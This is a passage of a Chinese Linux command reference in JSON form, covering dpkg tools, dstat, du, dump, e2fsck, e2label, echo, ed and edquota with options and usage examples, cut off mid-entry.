Linux中软件包的查询工具，它从dpkg软件包数据库中查询并辨识软件包的信息。\n\n###  语法\n\n```shell\ndpkg-query(选项)(参数)\n```\n\n###  选项\n\n```shell\n-l：列出符合匹配模式的软件包；\n-s：查询软件包的状态信息；\n-L：显示软件包所安装的文件列表；\n-S：从安装的软件包中查询文件；\n-w：显示软件包信息；\n-c：显示软件包的控制文件路径；\n-p：显示软件包的细节。\n```\n\n###  参数\n\n软件包名称：指定需要查询的软件包。\n\n###  实例\n\n查找文件file1在哪个包里安装：\n\n```shell\ndpkg-query -S file1\n```\n\n列出ubuntu下所安装软件列表：\n\n```shell\ndpkg-query -W --showformat='${Package} ${Version}\\n' > filename\n```\n\n查看软件包详细信息：\n\n```shell\ndpkg-query -s capistrano\n```\n\n查看软件包安装时安装到系统的文件列表：\n\n```shell\ndpkg-query -L capistrano\n```\n\n列出所有安装的包：\n\n```shell\ndpkg-query -l\n```\n\n查看软件包的确切状态（是否安装）以及版本号：\n\n```shell\ndpkg-query -W -f='${Status} ${Version}\\n' apache-perl\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-query"]},{"title":"【Linux 命令】dpkg-reconfigure","url":"/linux-command/dpkg-reconfigure/","content":"\nDebian Linux中重新配制一个已经安装的软件包\n\n## 补充说明\n\n**dpkg-reconfigure命令** 是Debian Linux中重新配置已经安装过的软件包，可以将一个或者多个已安装的软件包传递给此指令，它将询问软件初次安装后的配置问题。\n\n当用户需要再次对软件包配置的时候，可以使用dpkg-reconfigure命令来对指定的软件包进行配置。\n\n###  语法\n\n```shell\ndpkg-reconfigure(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：重新配置所有的软件包；\n-u或--unseen-only：仅显示未提过的问题；\n--default-priority：使用默认优先级，而非“低”级；\n--force：强制执行操作，需谨慎使用此选项；\n--no-reload：不要轻易的重装模板（使用时请慎重考虑）；\n-f或--frontend：指定 debconf 前端界面；\n-p或--priority：指定要显示的问题的最优先级；\n--terse：开启简要模式。\n```\n\n###  参数\n\n软件包名：需要重新配置的已安装的软件包。\n\n###  实例\n\n用于配置语言：\n\n```shell\nsudo dpkg-reconfigure locales\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-reconfigure"]},{"title":"【Linux 命令】dpkg-split","url":"/linux-command/dpkg-split/","content":"\nDebian Linux中将大软件包分割成小包\n\n## 补充说明\n\n**dpkg-split命令** 用来将Debian Linux中的大软件包分割成小软件包，它还能够将已分割的文件进行合并。\n\n###  语法\n\n```shell\ndpkg-split(选项)(参数)\n```\n\n###  选项\n\n```shell\n-S：设置分割后的每个小文件最大尺寸（以字节为单位）；\n-s：分割软件包；\n-j<分块文件><分块文件>：把各个分块合并到一起；\n-I<分块文件>：显示分块文件的相关信息；\n-l：列出不匹配的部分；\n-dscard<文件名>：忽略不匹配的部分。\n```\n\n###  参数\n\n软件包：指定需要分割的“.deb”软件包。\n\n###  实例\n\n把foo.deb分割出N个大小为460KB的文件：\n\n```shell\ndpkg-split -s foo.deb\n```\n\n合并分割文件：\n\n```shell\ndpkg-split -j \"foo*\"\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-split"]},{"title":"【Linux 命令】dpkg-statoverride","url":"/linux-command/dpkg-statoverride/","content":"\nDebian Linux中覆盖文件的所有权和模式\n\n## 补充说明\n\n**dpkg-statoverride命令** 用于Debian Linux中覆盖文件的所有权和模式，让dpkg于包安装时使得文件所有权与模式失效。\n\n###  语法\n\n```shell\ndpkg-statoverride(选项)\n```\n\n###  选项\n\n```shell\n-add：为文件添加一个改写；\n--remove：为文件删除一个改写；\n--list：显示所有改写列表；\n--update：如果文件存在，则立刻执行改写操作。\n```\n\n###  实例\n\n修改文件夹的权限属性：\n\n```shell\nsudo dpkg-statoverride --update --add nagios nagios 751 /var/lib/nagios3\n```\n\n强制修改文件夹的权限属性：\n\n```shell\nsudo dpkg-statoverride --force --update --add root sasl 755 /var/spool/postfix/var/run/saslauthd\n```\n\n将文件从数据库中删除：\n\n```shell\nsudo dpkg-statoverride --remove /usr/bin/wall\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-statoverride"]},{"title":"【Linux 命令】dpkg-trigger","url":"/linux-command/dpkg-trigger/","content":"\nDebian Linux下的软件包触发器\n\n## 补充说明\n\n**dpkg-trigger命令** 是Debian Linux下的软件包触发器。\n\n###  语法\n\n```shell\ndpkg-trigger(选项)(参数)\n```\n\n###  选项\n\n```shell\n--check-supported：检查运行的dpkg是否支持触发器，返回值为0，则支持触发器。\n--help：显示帮助信息；\n--admindir=<目录>：设置dpkg数据库所在的目录；\n--no-act：仅用于测试，不执行任何操作；\n--by-package=<软件包>：覆盖触发器等待者。\n```\n\n###  参数\n\n触发器名：指定触发器名称。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg-trigger"]},{"title":"【Linux 命令】dpkg","url":"/linux-command/dpkg/","content":"\nDebian Linux系统上安装、创建和管理软件包\n\n## 补充说明\n\n**dpkg命令** 是Debian Linux系统用来安装、创建和管理软件包的实用工具。\n\n###  语法\n\n```shell\ndpkg(选项)(参数)\n```\n\n###  选项\n\n```shell\n-i：安装软件包；\n-r：删除软件包；\n-P：删除软件包的同时删除其配置文件；\n-L：显示于软件包关联的文件；\n-l：显示已安装软件包列表；\n--unpack：解开软件包；\n-c：显示软件包内文件列表；\n--confiugre：配置软件包。\n```\n\n###  参数\n\nDeb软件包：指定要操作的.deb软件包。\n\n###  实例\n\n```shell\ndpkg -i package.deb     # 安装包\ndpkg -r package         # 删除包\ndpkg -P package         # 删除包（包括配置文件）\ndpkg -L package         # 列出与该包关联的文件\ndpkg -l package         # 显示该包的版本\ndpkg --unpack package.deb  # 解开deb包的内容\ndpkg -S keyword            # 搜索所属的包内容\ndpkg -l                    # 列出当前已安装的包\ndpkg -c package.deb        # 列出deb包的内容\ndpkg --configure package   # 配置包\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dpkg"]},{"title":"【Linux 命令】dris","url":"/linux-command/dris/","content":"\n显示和清空目录堆栈中的内容\n\n## 补充说明\n\n**dris命令** 用于显示和清空目录堆栈中的内容。\n\n###  语法\n\n```shell\ndris(选项)\n```\n\n###  选项\n\n```shell\n+n：显示从左边算起第n笔的目录；\n-n：显示从右边算起第n笔的目录；\n-l：显示目录完整的记录。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dris"]},{"title":"【Linux 命令】dstat","url":"/linux-command/dstat/","content":"\n通用的系统资源统计工具\n\n## 补充说明\n\n**dstat命令** 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具，是一个全能系统信息统计工具。与sysstat相比，dstat拥有一个彩色的界面，在手动观察性能状况时，数据比较显眼容易观察；而且dstat支持即时刷新，譬如输入`dstat 3`即每三秒收集一次，但最新的数据都会每秒刷新显示。和sysstat相同的是，dstat也可以收集指定的性能资源，譬如`dstat -c`即显示CPU的使用情况。\n\n###  下载安装\n\n **方法一** \n\n```shell\nyum install -y dstat\n```\n\n **方法二** \n\n官网下载地址：http://dag.wieers.com/rpm/packages/dstat\n\n```shell\nwget http://dag.wieers.com/rpm/packages/dstat/dstat-0.6.7-1.rh7.rf.noarch.rpm\nrpm -ivh dstat-0.6.7-1.rh7.rf.noarch.rpm\n```\n\n###  使用说明\n\n安装完后就可以使用了，dstat非常强大，可以实时的监控cpu、磁盘、网络、IO、内存等使用情况。\n\n直接使用dstat，默认使用的是`-cdngy`参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。可以在最后指定显示一条信息的时间间隔，如`dstat 5`是没5s显示一条，`dstat 5 10`表示没5s显示一条，一共显示10条。\n\n```shell\n[root@iZ23uulau1tZ ~]# dstat\n----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system--\nusr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw\n  0   0  99   0   0   0|7706B  164k|   0     0 |   0     0 | 189   225\n  0   0 100   0   0   0|   0     0 |4436B  826B|   0     0 | 195   248\n  1   0  99   0   0   0|   0     0 |4744B  346B|   0     0 | 203   242\n  0   0 100   0   0   0|   0     0 |5080B  346B|   0     0 | 206   242\n  0   1  99   0   0   0|   0     0 |5458B  444B|   0     0 | 214   244\n  1   0  99   0   0   0|   0     0 |5080B  346B|   0     0 | 208   242\n```\n\n下面对显示出来的部分信息作一些说明：\n\n1.  cpu：hiq、siq分别为硬中断和软中断次数。\n2.  system：int、csw分别为系统的中断次数（interrupt）和上下文切换（context switch）。\n\n其他的都很好理解。\n\n###  语法\n\n```shell\ndstat [-afv] [options..] [delay [count]]\n```\n\n###  常用选项\n\n```shell\n-c：显示CPU系统占用，用户占用，空闲，等待，中断，软件中断等信息。\n-C：当有多个CPU时候，此参数可按需分别显示cpu状态，例：-C 0,1 是显示cpu0和cpu1的信息。\n-d：显示磁盘读写数据大小。\n-D hda,total：include hda and total。\n-n：显示网络状态。\n-N eth1,total：有多块网卡时，指定要显示的网卡。\n-l：显示系统负载情况。\n-m：显示内存使用情况。\n-g：显示页面使用情况。\n-p：显示进程状态。\n-s：显示交换分区使用情况。\n-S：类似D/N。\n-r：I/O请求情况。\n-y：系统状态。\n--ipc：显示ipc消息队列，信号等信息。\n--socket：用来显示tcp udp端口状态。\n-a：此为默认选项，等同于-cdngy。\n-v：等同于 -pmgdsc -D total。\n--output 文件：此选项也比较有用，可以把状态信息以csv的格式重定向到指定的文件中，以便日后查看。例：dstat --output /root/dstat.csv & 此时让程序默默的在后台运行并把结果输出到/root/dstat.csv文件中。\n```\n\n当然dstat还有很多更高级的用法，常用的基本这些选项，更高级的用法可以结合man文档。\n\n###  实例\n\n如想监控swap，process，sockets，filesystem并显示监控的时间：\n\n```shell\n[root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:23:48|   0     0 |  0   0 0.0|104   8   5   0   0|  704   6488\n26-07 09:23:49|   0     0 |  0   0   0|104   8   5   0   0|  704   6488\n26-07 09:23:50|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:51|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:52|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n26-07 09:23:53|   0     0 |  0   0   0|104   8   5   0   0|  704   6489\n```\n\n若要将结果输出到文件可以加`--output filename`：\n\n```shell\n[root@iZ23uulau1tZ ~]# dstat -tsp --socket --fs --output /tmp/ds.csv\n----system---- ----swap--- ---procs--- ------sockets------ --filesystem-\n  date/time   | used  free|run blk new|tot tcp udp raw frg|files  inodes\n26-07 09:25:31|   0     0 |  0   0 0.0|104   8   5   0   0|  736   6493\n26-07 09:25:32|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:33|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:34|   0     0 |  0   0   0|104   8   5   0   0|  736   6493\n26-07 09:25:35|   0     0 |  0   0   0|104   8   5   0   0|  736   6494\n26-07 09:25:36|   0     0 |  0   0   0|104   8   5   0   0|  736   6494\n```\n\n这样生成的csv文件可以用excel打开，然后生成图表。\n\n通过`dstat --list`可以查看dstat能使用的所有参数，其中上面internal是dstat本身自带的一些监控参数，下面`/usr/share/dstat`中是dstat的插件，这些插件可以扩展dstat的功能，如可以监控电源（battery）、mysql等。\n\n下面这些插件并不是都可以直接使用的，有的还依赖其他包，如想监控mysql，必须要装python连接mysql的一些包。\n\n```shell\n[root@iZ23uulau1tZ ~]# dstat --list\ninternal:\n        aio, cpu, cpu24, disk, disk24, disk24old, epoch, fs, int, int24, io, ipc, load, lock, mem, net, page, page24, proc, raw, socket, swap, swapold, sys, tcp, time, udp, unix, vm\n/usr/share/dstat:\n        battery, battery-remain, cpufreq, dbus, disk-util, fan, freespace, gpfs, gpfs-ops, helloworld, innodb-buffer, innodb-io, innodb-ops, lustre, memcache-hits, mysql-io, mysql-keys, mysql5-cmds, mysql5-conn, mysql5-io, mysql5-keys,\n        net-packets, nfs3, nfs3-ops, nfsd3, nfsd3-ops, ntp, postfix, power, proc-count, rpc, rpcd, sendmail, snooze, thermal, top-bio, top-cpu, top-cputime, top-cputime-avg, top-io, top-latency, top-latency-avg, top-mem, top-oom, utmp,\n        vm-memctl, vmk-hba, vmk-int, vmk-nic, vz-cpu, vz-io, vz-ubc, wifi\n```\n\ndstat命令的基本用法就说到这里，更多用法有待摸索，如果您需要补充内容请给我们发邮件，谢谢！\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dstat"]},{"title":"【Linux 命令】du","url":"/linux-command/du/","content":"\n显示每个文件和目录的磁盘使用空间\n\n## 补充说明\n\n**du命令** 也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。\n\n### 语法\n\n```shell\ndu [选项][文件]\n```\n\n### 选项\n\n```shell\n-a, --all                              显示目录中个别文件的大小。\n-B, --block-size=大小                  使用指定字节数的块\n-b, --bytes                            显示目录或文件大小时，以byte为单位。\n-c, --total                            除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。\n-D, --dereference-args                 显示指定符号链接的源文件大小。\n-H, --si                               与-h参数相同，但是K，M，G是以1000为换算单位。\n-h, --human-readable                   以K，M，G为单位，提高信息的可读性。\n-k, --kilobytes                        以KB(1024bytes)为单位输出。\n-l, --count-links                      重复计算硬件链接的文件。\n-m, --megabytes                        以MB为单位输出。\n-L<符号链接>, --dereference<符号链接>  显示选项中所指定符号链接的源文件大小。\n-P, --no-dereference                   不跟随任何符号链接(默认)\n-0, --null                             将每个空行视作0 字节而非换行符\n-S, --separate-dirs                    显示个别目录的大小时，并不含其子目录的大小。\n-s, --summarize                        仅显示总计，只列出最后加总的值。\n-x, --one-file-xystem                  以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。\n-X<文件>, --exclude-from=<文件>        在<文件>指定目录或文件。\n--apparent-size                        显示表面用量，而并非是磁盘用量；虽然表面用量通常会小一些，但有时它会因为稀疏文件间的\"洞\"、内部碎片、非直接引用的块等原因而变大。\n--files0-from=F                        计算文件F中以NUL结尾的文件名对应占用的磁盘空间如果F的值是\"-\"，则从标准输入读入文件名\n--exclude=<目录或文件>                 略过指定的目录或文件。\n--max-depth=N                          显示目录总计(与--all 一起使用计算文件)当N为指定数值时计算深度为N，等于0时等同--summarize\n--si                                   类似-h，但在计算时使用1000 为基底而非1024\n--time                                 显示目录或该目录子目录下所有文件的最后修改时间\n--time=WORD                            显示WORD时间，而非修改时间：atime，access，use，ctime 或status\n--time-style=样式                      按照指定样式显示时间(样式解释规则同\"date\"命令)：full-iso，long-iso，iso，+FORMAT\n--help                                 显示此帮助信息并退出\n--version                              显示版本信息并退出\n```\n\n### 实例\n\n文件从大到小排序\n```\nubuntu@VM-0-14-ubuntu:~/git-work/linux-command$ du -sh * |sort -rh\n2.9M    command\n1.9M    assets\n148K    template\n72K     package-lock.json\n52K     dist\n28K     build\n16K     README.md\n4.0K    renovate.json\n4.0K    package.json\n4.0K    LICENSE\n```\n\n只显示当前目录下子目录的大小。\n\n```shell\nubuntu@VM-0-14-ubuntu:~/git-work/linux-command$ du -sh ./*/\n1.9M    ./assets/\n28K     ./build/\n2.9M    ./command/\n52K     ./dist/\n148K    ./template/\n```\n\n查看指定目录下文件所占的空间：\n\n```shell\nubuntu@VM-0-14-ubuntu:~/git-work/linux-command/assets$ du ./*\n144     ./alfred.png\n452     ./chrome-extensions.gif\n4       ./dash-icon.png\n1312    ./Linux.gif\n16      ./qr.png\n```\n\n只显示总和的大小:\n\n```shell\nubuntu@VM-0-14-ubuntu:~/git-work/linux-command/assets$ du -s .\n1932    .\n```\n\n显示总和的大小且易读:\n\n```shell\nubuntu@VM-0-14-ubuntu:~/git-work/linux-command/assets$ du -sh .\n1.9M    .\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","du"]},{"title":"【Linux 命令】dump","url":"/linux-command/dump/","content":"\n用于备份ext2或者ext3文件系统\n\n## 补充说明\n\n**dump命令** 用于备份ext2或者ext3文件系统。可将目录或整个文件系统备份至指定的设备，或备份成一个大文件。\n\n###  语法\n\n```shell\ndump(选项)(参数)\n```\n\n###  选项\n\n```shell\n-0123456789：备份的层级；\n-b<区块大小>：指定区块的大小，单位为KB；\n-B<区块数目>：指定备份卷册的区块数目；\n-c：修改备份磁带预设的密度与容量；\n-d<密度>：设置磁带的密度。单位为BPI；\n-f<设备名称>：指定备份设备；\n-h<层级>：当备份层级等于或大于指定的层级时，将不备份用户标示为“nodump”的文件；\n-n：当备份工作需要管理员介入时，向所有“operator”群组中的使用者发出通知；\n-s<磁带长度>：备份磁带的长度，单位为英尺；\n-T<日期>：指定备份的时间与日期；\n-u：备份完毕后，在/etc/dumpdates中记录备份的文件系统、层级、日期与时间等；\n-w：与-W类似，但仅显示需要备份的文件；\n-W：显示需要备份的文件及其最后一次备份的层级、时间与日期。\n```\n\n###  参数\n\n备份源：指定要备份的文件、目录或者文件系统。\n\n###  实例\n\n将`/home`目录所有内容备份到`/tmp/homeback.bak`文件中，备份层级为`0`并在`/etc/dumpdates`中记录相关信息：\n\n```shell\n‍dump -0u -f /tmp/homeback.bak /home\n```\n\n将`/home`目录所有内容备份到`/tmp/homeback.bak`文件中，备份层级为`1`（只备份上次使用层次`0`备份后发生过改变的数据）并在`/etc/dumpdates`中记录相关信息：\n\n```shell\ndump -1u -f /tmp/homeback.bak /home\n```\n\n通过dump命令的备份层级，可实现完整+增量备份、完整+差异备份，在配合crontab可以实现无人值守备份。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","dump"]},{"title":"【Linux 命令】e2fsck","url":"/linux-command/e2fsck/","content":"\n用于检查第二扩展文件系统的完整性\n\n## 补充说明\n\n**e2fsck命令** 用于检查第二扩展文件系统的完整性，通过适当的选项可以尝试修复出现的错误。\n\ne2fsck执行后的传回值及代表意义如下：\n\n*   0 没有任何错误发生。\n*   1 文件系统发生错误，并且已经修正。\n*   2 文件系统发生错误，并且已经修正。\n*   4 文件系统发生错误，但没有修正。\n*   8 运作时发生错误。\n*   16 使用的语法发生错误。\n*   128 共享的函数库发生错误。\n\n### 语法\n\n```shell\ne2fsck(选项)(参数)\n```\n\n### 选项\n\n```shell\n-a：不询问使用者意见，便自动修复文件系统；\n-b<superblock>：指定superblock，而不使用预设的superblock；\n-B<区块大小>：指定区块的大小，单位为字节；\n-c：一并执行badblocks，以标示损坏的区块；\n-C：将检查过程的信息完整记录在file descriptor中，使得整个检查过程都能完整监控；\n-d：显示排错信息；\n-f：即使文件系统没有错误迹象，仍强制地检查正确性；\n-F：执行前先清除设备的缓冲区；\n-l<文件>：将文件中指定的区块加到损坏区块列表；\n-L<文件>：先清除损坏区块列表，再将文件中指定的区块加到损坏区块列表。因此损坏区块列表的区块跟文件中指定的区块是一样的；\n-n：以只读模式开启文件系统，并采取非互动方式执行，所有的问题对话均设置以\"no\"回答；\n-p：不询问使用者意见，便自动修复文件系统；\n-r：此参数只为了兼容性而存在，并无实际作用；\n-s：如果文件系统的字节顺序不适当，就交换字节顺序，否则不做任何动作；\n-S：不管文件系统的字节顺序，一律交换字节顺序；\n-t：显示时间信息；\n-v：执行时显示详细的信息；\n-V：显示版本信息；\n-y：采取非互动方式执行，所有的问题均设置以\"yes\"回答。\n```\n\n### 参数\n\n文件系统或者分区：指定文件系统或者分区所对应的设备文件名。\n\n### 实例\n\n检查`/dev/sda1`是否有问题，如发现问题便自动修复：\n\n```shell\ne2fsck -a -y /dev/sda1\n```\n\n执行e2fsck或fsck前请先umount partition，否则有机会令档案系统毁损。如果需要对根目录`/`进行检查及修复，便需要进入singal user mode执行。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","e2fsck"]},{"title":"【Linux 命令】e2label","url":"/linux-command/e2label/","content":"\n设置第二扩展文件系统的卷标\n\n## 补充说明\n\n**e2label命令** 用来设置第二扩展文件系统的卷标。\n\n###  语法\n\n```shell\ne2label(参数)\n```\n\n###  参数\n\n*   文件系统：指定文件系统所对应的设备文件名；\n*   新卷标：为文件系统指定新卷标。\n\n###  实例\n\n许多用了多年Linux的人可能也没有用过e2label命令。但是这个命令相当有效。在介绍它之前,我们先看看`/etc/fstab文`件：\n\n```shell\nlabel=//ext3 defaults 1 1\n/dev/hda7 /usr ext3 defaults 1 1\n```\n\n第二行的意思很容易懂，就是把`/dev/hda7` mount到`/usr`上。第一行没有指明分区，意思是把label(卷标)为/ 的分区mount到/上。这样写的好处在于即使如果把硬盘从主板上的ide0(hda) 换到ide2(hdc)上，系统仍然可以自动挂载正确的分区。通常Linux安装的时候已经自动指定了卷标。如果是手动增加的新分区，可以用下边的命令为 其指定卷标：\n\n```shell\ne2label /dev/hdax /new\nmkdir /new\n```\n\n然后在`/etc/fstab`里加入：\n\n```shell\nlabel=/new  /new  ext3  defaults  1 1\n```\n\n下次重新起动机器的时候，就会把卷标为`/new`的分区挂接到`/new`上。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","e2label"]},{"title":"【Linux 命令】echo","url":"/linux-command/echo/","content":"\n输出指定的字符串或者变量\n\n## 补充说明\n\n**echo命令** 用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。\n\n###  语法 \n\n```shell\necho(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-e：激活转义字符。\n```\n\n使用`-e`选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：\n\n- `\\a` 发出警告声；\n- `\\b` 删除前一个字符；\n- `\\c` 不产生进一步输出 (\\c 后面的字符不会输出)；\n- `\\f` 换行但光标仍旧停留在原来的位置；\n- `\\n` 换行且光标移至行首；\n- `\\r` 光标移至行首，但不换行；\n- `\\t` 插入tab；\n- `\\v` 与\\f相同；\n- `\\\\` 插入\\字符；\n- `\\nnn` 插入 `nnn`（八进制）所代表的ASCII字符；\n\n###  参数 \n\n变量：指定要打印的变量。\n\n###  实例 \n\n用echo命令打印带有色彩的文字：\n\n **文字色：** \n\n```shell\necho -e \"\\e[1;31mThis is red text\\e[0m\"\nThis is red text\n```\n\n*   `\\e[1;31m` 将颜色设置为红色\n*   `\\e[0m` 将颜色重新置回\n\n颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37\n\n **背景色** ：\n\n```shell\necho -e \"\\e[1;42mGreed Background\\e[0m\"\nGreed Background\n```\n\n颜色码：重置=0，黑色=40，红色=41，绿色=42，黄色=43，蓝色=44，洋红=45，青色=46，白色=47\n\n **文字闪动：** \n\n```shell\necho -e \"\\033[37;31;5mMySQL Server Stop...\\033[39;49;0m\"\n```\n\n红色数字处还有其他数字参数：0 关闭所有属性、1 设置高亮度（加粗）、4 下划线、5 闪烁、7 反显、8 消隐\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","echo"]},{"title":"【Linux 命令】ed","url":"/linux-command/ed/","content":"\n单行纯文本编辑器\n\n## 补充说明\n\n**ed命令** 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。ed命令支持多个内置命令，常见内置命令如下：\n\n###  语法\n\n```shell\ned(选项)(参数)\n```\n\n###  选项\n\n```shell\nA # 切换到输入模式，在文件的最后一行之后输入新的内容；\nC # 切换到输入模式，用输入的内容替换掉最后一行的内容；\ni # 切换到输入模式，在当前行之前加入一个新的空行来输入内容；\nd # 用于删除最后一行文本内容；\nn # 用于显示最后一行的行号和内容；\nw # <文件名>：一给定的文件名保存当前正在编辑的文件；\nq # 退出ed编辑器。\n```\n\n```shell\n-G或——traditional：提供兼容的功能；\n-p<字符串>：指定ed在command mode的提示字符；\n-s，-，--quiet或——silent：不执行开启文件时的检查功能；\n--help：显示帮助；\n--version：显示版本信息。\n```\n\n###  参数\n\n文件：待编辑的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ed"]},{"title":"【Linux 命令】edquota","url":"/linux-command/edquota/","content":"\n用于编辑指定用户或工作组磁盘配额\n\n## 补充说明\n\n**edquota命令** 用于编辑指定用户或工作组磁盘配额。edquota预设会使用vi来编辑使用者或群组的quota设置。\n\n###  语法\n\n```shell\nedquota(选项)(参数)\n```\n\n###  选项\n\n```shell\n-u：设置用户的quota，这是预设的参数；\n-g：设置群组的quota；\n-p<源用户名称>：将源用户的quota设置套用至其他用户或群组；\n-t：设置宽限期限。\n```\n\n###  参数\n\n用户：指定要编辑磁盘配额限制的用户名或者工作组。\n\n###  实例\n\n **配置系统的磁盘配额支持** \n\n首先，磁盘配额是区域性的，我们可以决定哪块分区进行磁盘配额，哪块分区不用（自然也就不用配置了）。一般而言，作为一台web虚拟主机服务器，`/home`和`/www`（或者类似的）是供用户存放资源的分区，所以可以对这两个分区进行磁盘配额。假定我们需要对`/home`分区实现用户级的限制，而对`/www`进行每个组的用户配额。\n\n第一步：\n\n```shell\nvi /etc/fstab\n```\n\n找到对应于`/home`和`/www`的行，例如：\n\n```shell\n/dev/sda5 /home ext2 defaults 1 2\n/dev/sda7 /www ext2 defaults 1 2\n```\n\n在`/home`里实现用户级的磁盘配额，所以对sda5行的挂装选项域做如下修改：\n\n```shell\n/dev/sda5 /home ext2 defaults，usrquota 1 2\n```\n\n注意，是usrquota哦。类似的，我们可以如下修改`/www`行：\n\n```shell\n/dev/sda7 /www ext2 defaults，grpquota 1 2\n```\n\n如编辑根用户\n\n改`/etc/fstab`文件中\n\n```shell\nLABEL=/ / ext2 defaults,usrquota,grpquota 1 1\n```\n\n说明：`/etc/fstab`文件的每一行由六个字段组成：\n\n*   第一个字段：文件系统（分区）的注释（类似卷标）；\n*   第二个字段：文件系统的装载点；\n*   第三个字段：文件系统类型（磁盘配额只能在ext2文件系统上实现）；\n*   第四个字段：装载文件系统是使用的选项，如果只想实现基于用户的磁盘配额，就加入usrquota关键字，只想实现基于组的磁盘配额，就加入grpqouta关键字，如果两者都需要，就全写入，中间可以用逗号分隔。\n*   第五个字段：表明该文件系统（分区）是否为只读，如果是0就表示只读，1表示可以读写。\n*   第六个字段：表示系统启动执行fsck时检查的顺序。\n\n注意：请特别注意这里的拼写，是usrquota和grpquota，不要写成userquota和groupquota。\n\n进入单用户模式，用quotacheck生成.user或.group文件\n\nquotacheck 你的目录\n\n```shell\nexample:quotacheck / ; quotacheck /home\n```\n\n如果单用户模式报错的话umount你的设备`/dev/hda*`\n\n再执行就ok了，重启动系统，如果一切正常的话，quota将开始正常工作。\n\n **设置用户和组配额的分配量** \n\n对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。\n\n*   软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。\n*   硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。\n\n **通过edquota直接编辑数据文件：** \n\n使用编辑配额命令edquota为用户配置定额，在重新启动系统之后，我们假设lanf是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额：\n\n```shell\nedquota -u lanf\n```\n\n这个命令将启动默认文本编辑器（如vi或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示：\n\n```shell\nQuotas for user lanf:\n/dev/sda5:blocks in use:0,limits(soft = 0,hard = 0)\ninodes in use:0,limits(soft = 0,hard = 0)\n```\n\n这表示lanf用户在`/dev/sda5`分区（该分区已经在usrquota的控制之下）中迄今使用了0个数据块（以K为单位），并且没有设限制（包括软限制soft和硬限制hard），同样，lanf在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改blocks行的limits部分就可以了，注意单位使用的是K。例如要为lanf分配100M磁盘的软限制，400M硬限制，可以使用如下的设置：\n\n```shell\nQuotas for user lanf:\n/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\ninodes in use:0,limits(soft = 0,hard = 0)\n```\n\n同样的，要对文件目录的数量限制可以相应的修改inodes行。我们也可以同时对这两项都作出限制。只需要如下的修改Quotas for user lanf：\n\n```shell\n/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\ninodes in use:0,limits(soft = 12800,hard = 51200)\n```\n\n这表示除了相应的容量的限制外，还对文件/目录的数量做了12800个的软限制和51200个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好edquota还有个-p参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对Jack、Tom、Chen三个用户使用和lanf一样的限额配置，可以使用如下的命令：\n\n```shell\nedquota -p lanf -u Jack Tom Chen\n```\n\n这样一来，这三个用户就被赋予了和lanf一样的磁盘配额。\n\n对组的配额，除了edquota命令中对应`-u`选项的改为`-g`选项，例如下面对webterm1组的操作：\n\n```shell\nedquota -g 